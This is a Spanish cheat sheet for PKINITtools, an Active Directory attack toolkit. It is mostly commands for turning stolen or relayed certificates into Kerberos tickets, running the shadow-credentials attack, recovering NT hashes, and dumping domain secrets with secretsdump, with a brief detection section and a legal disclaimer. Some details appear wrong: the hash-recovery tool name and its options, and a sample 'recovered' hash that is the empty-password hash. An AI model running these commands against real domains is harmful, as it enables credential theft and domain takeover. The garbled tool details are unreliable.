<!-- language-home-navigation -->
[🏠 Página Principal Española](../../README.es.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇫🇷 Français](README.fr.md) • [🇮🇹 Italiano](README.it.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🎫 PKINITtools - Hoja de referencia completa

[🇹🇷 Türkçe Sürüm](traducciones/README.tr.md)
```
  ██████╗ ██╗  ██╗██╗███╗   ██╗██╗████████╗████████╗ ██████╗  ██████╗ ██╗     ███████╗
  ██╔══██╗██║ ██╔╝██║████╗  ██║██║╚══██╔══╝╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔════╝
  ██████╔╝█████╔╝ ██║██╔██╗ ██║██║   ██║      ██║   ██║   ██║██║   ██║██║     ███████╗
  ██╔═══╝ ██╔═██╗ ██║██║╚██╗██║██║   ██║      ██║   ██║   ██║██║   ██║██║     ╚════██║
  ██║     ██║  ██╗██║██║ ╚████║██║   ██║      ██║   ╚██████╔╝╚██████╔╝███████╗███████║
  ╚═╝     ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚═╝   ╚═╝      ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝
       Kerberos PKINIT Authentication, Shadow Credentials & UnPAC-the-Hash Toolkit
```
<p align="centro">
  <img src="https://img.shields.io/badge/PKINITtools-Kerberos_PKINIT-blue?style=for-the-badge" alt="PKINITtools">
  <img src="https://img.shields.io/badge/Author-Dirk--jan_Mollema-orange?style=for-the-badge" alt="dirkjanm">
  <img src="https://img.shields.io/badge/Category-Active_Directory_&_Network-green?style=for-the-badge" alt="Active Directory">
  <img src="https://img.shields.io/badge/License-MIT-red?style=for-the-badge" alt="Licencia MIT">
</p>

<p align="centro">
  <b>🌐 Herramientas para criptografía de clave pública Kerberos para autenticación inicial (PKINIT), conversión de certificados a tickets TGT y recuperación de hashes NT</b>
</p>

---

## 📋 Tabla de contenidos

- [Descripción general y arquitectura PKINIT] (#-descripción general--la-arquitectura-pkinit)
- [Utilidades clave: `gettgtpkinit.py` y `getskeyhash.py`](#-key-utilities-gettgtpkinitpy--getskeyhashpy)
- [Instalación](#-instalación)
- [Conversión de certificados AD CS a Kerberos TGT](#-converting-ad-cs-certificates-to-kerberos-tgt)
  - [Usando un archivo PFX](#usando-un-archivo-pfx)
  - [Uso de PFX codificado en Base64 (cadenas de relés)] (#uso-de-cadenas-de-relés-pfx-codificados-en-base64)
- [Recuperación de NT Hashes (UnPAC-the-Hash)](#-recovering-nt-hashes-unpac-the-hash)
- [Flujo de trabajo de ataque de credenciales de sombra] (#-flujo de trabajo-de-ataque-de-credenciales-de-sombra)
- [Consumiendo el TGT con Impacket y NetExec](#-consumiendo-el-tgt-con-impacket--netexec)
- [Tabla de referencia rápida](#-tabla-de-referencia-rápida)
- [Consideraciones defensivas y detección](#-consideraciones-defensivas--detección)
- [Aviso legal](#-aviso-legal)

---

## 🎯 Descripción general y arquitectura PKINIT

**PKINIT** (Criptografía de clave pública para autenticación inicial en Kerberos, definida en **RFC 4556**) es una extensión del protocolo Kerberos. En lugar de requerir el hash de contraseña secreta de un usuario (NTLM o AES) para solicitar un ticket de concesión de boletos Kerberos (TGT), PKINIT permite que un cliente demuestre su identidad utilizando **certificados digitales X.509 y pares de claves pública/privada**.

Creado por el reconocido investigador de Active Directory **Dirk-jan Mollema (@_dirkjan)**, **PKINITtools** proporciona las primitivas esenciales de Python para:
1. Autenticarse en los controladores de dominio de Active Directory a través de PKINIT utilizando certificados digitales extraídos o retransmitidos.
2. Obtenga un archivo Kerberos TGT estándar (`.ccache`).
3. Recupere el texto sin cifrar **NTLM Hash** de la cuenta mediante el mecanismo **UnPAC-the-Hash**.

---

## 🧰 Utilidades clave: `gettgtpkinit.py` y `getskeyhash.py`

- **`gettgtpkinit.py`**: Se comunica con el KDC (Centro de distribución de claves Kerberos) a través del puerto 88, presenta el certificado y solicita un TGT blindado, guardándolo como un archivo Kirbi o ccache.
- **`getskeyhash.py`**: Interroga el PAC (Certificado de Atributo de Privilegio) de Kerberos devuelto en el ticket PKINIT para calcular y exponer el hash NT estático de la cuenta.

---

## 📥 Instalación
```bash
# Clone GitHub repository
git clone https://github.com/dirkjanm/PKINITtools.git
cd PKINITtools

# Install dependencies (requires impacket, cryptography, minikerberos)
pip3 install -r requirements.txt
pip3 install .
```
---

## 🎫 Conversión de certificados AD CS a Kerberos TGT

Cuando obtiene un certificado de Active Directory a través de Certipy, Coercer o NTLM Relay:

### Usando un archivo PFX
```bash
# Request TGT using a client certificate file (.pfx)
gettgtpkinit.py -cert-pfx administrator.pfx -pfx-pass 'CertPass123' corp.local/administrator admin.ccache
```
### Uso de PFX codificado en Base64 (cadenas de relés)

A menudo, `ntlmrelayx` imprime certificados como una cadena base64 sin formato durante los ataques AD CS ESC8:
```bash
# Convert base64 certificate directly into a Kerberos TGT for Domain Controller (DC01$)
gettgtpkinit.py -pfx-base64 "MIIKggIBAzCCCXwGCSqGSIb3DQEHA..." corp.local/DC01\$ dc01.ccache
```
---

## 🔑 Recuperación de NT Hashes (UnPAC-the-Hash)

Cuando una cuenta se autentica con PKINIT, el controlador de dominio firma el PAC con una estructura PAC_CREDENTIAL_INFO que contiene el **hash NTLM** estático de la cuenta (cifrado con una clave AS-REP temporal). `getskeyhash.py` descifra esta estructura:
```bash
# Extract the NTLM hash directly from the ticket and KDC
getskeyhash.py -hashes :7fc508... corp.local/administrator admin.ccache

# Output format:
# [*] Found PAC DATA
# [*] Decrypted PAC_CREDENTIAL_INFO
# [!] Recovered NT Hash: aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
```
Con el hash NT en la mano, puedes realizar inmediatamente **Pass-the-Hash** o craqueo fuera de línea.

---

## 👥 Flujo de trabajo de ataque de credenciales ocultas

Cuando tiene acceso de escritura sobre un objeto de Active Directory (`GenericAll`, `GenericWrite`, `WriteProperty` sobre `msDS-KeyCredentialLink`):
```bash
# 1. Use pyWhisker to inject a newly generated key credential into the victim object
pywhisker.py -d "corp.local" -u "lowuser" -p "Password123" --target "TargetUser" --action "add" --export "targetuser.pfx"

# 2. Use PKINITtools to authenticate with the forged certificate
gettgtpkinit.py -cert-pfx targetuser.pfx -pfx-pass "pywhisker" corp.local/TargetUser target.ccache

# 3. Extract TargetUser's NT Hash
getskeyhash.py corp.local/TargetUser target.ccache
```
---

## 🚀 Consumiendo el TGT con Impacket y NetExec

Una vez que `gettgtpkinit.py` genere un ticket `.ccache`, expórtelo al entorno:
```bash
# Set Kerberos credential cache environment variable
export KRB5CCNAME=/path/to/admin.ccache

# Dump domain secrets via Impacket without passwords!
impacket-secretsdump -k -no-pass corp.local/administrator@dc01.corp.local

# Connect via Evil-WinRM using Kerberos ticket
evil-winrm -i dc01.corp.local -r corp.local

# Execute commands using NetExec with Kerberos auth
nxc smb dc01.corp.local -k --no-pass -x "whoami /priv"
```
---

## ⚡ Tabla de referencia rápida

| Objetivo | Comando |
|-----------|------------------|
| **TGT mediante archivo PFX** | `gettgtpkinit.py -cert-pfx <FILE.pfx> <DOMAIN>/<USER> <OUT.ccache>` |
| **TGT mediante certificado Base64** | `gettgtpkinit.py -pfx-base64 "<BASE64>" <DOMAIN>/<USER> <OUT.ccache>` |
| **Especificar controlador de dominio**| `gettgtpkinit.py -dc-ip <DC_IP> -cert-pfx <CERT> <DOMAIN>/<USER> <TGT>` |
| **UnPAC-the-Hash (Obtener NTLM)**| `getskeyhash.py <DOMAIN>/<USER> <TGT.ccache>` |
| **Pasar TGT a Impacket** | `export KRB5CCNAME=<TGT.ccache>; impacket-secretsdump -k -no-pass <DOMAIN>/<USER>@<DC>` |
| **Pasar TGT a NetExec** | `export KRB5CCNAME=<TGT.ccache>; nxc smb <DC> -k --no-pass` |

---

## 🛡️ Consideraciones defensivas y detección

1. **ID de evento 4768 (Solicitud TGT):** Active Directory registra las solicitudes TGT de Kerberos. Cuando se utiliza PKINIT, el campo **Tipo de autenticación previa** muestra `16` (PKINIT), en lugar de `2` (PA-ENC-TIMESTAMP).
2. **Auditoría de modificaciones de `msDS-KeyCredentialLink`:** El ID de evento 5136 registra las modificaciones de los objetos del directorio. Alerta cuando se agregan credenciales clave a cuentas administradas que no son de Azure/Intune.

---

## ⚠️ Aviso legal

> [!PRECAUCIÓN]
> PKINITtools está destinado únicamente a auditorías de seguridad autorizadas de Active Directory, operaciones del Red Team e investigaciones educativas. Manipular tickets Kerberos corporativos sin permiso explícito es ilegal.